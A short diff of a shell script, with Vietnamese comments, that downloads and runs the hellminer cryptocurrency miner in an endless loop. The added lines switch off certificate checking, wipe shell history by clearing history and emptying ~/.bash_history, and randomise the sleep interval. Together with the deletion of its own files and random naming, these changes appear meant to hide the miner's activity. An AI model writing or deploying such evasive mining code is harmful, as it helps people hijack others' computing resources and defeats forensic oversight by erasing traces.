@@ -8,7 +8,7 @@ generate_random_name() {
 # Vòng lặp vô hạn để script chạy liên tục
 while true; do
   # Tải file
-  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+  wget -q --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
   # Giải nén file
   tar -xf hellminer_linux64_avx2.tar.gz
@@ -32,6 +32,11 @@ while true; do
   rm -rf run_miner.sh
   rm -rf verus-solver
 
-  # Nghỉ 1 phút trước khi lặp lại
-  sleep 2m
+  # Xóa lịch sử shell
+  history -c
+  cat /dev/null > ~/.bash_history
+
+  # Nghỉ ngẫu nhiên từ 2 phút đến 4 phút
+  sleep_time=$(shuf -i 120-240 -n 1)
+  sleep $sleep_time
 done
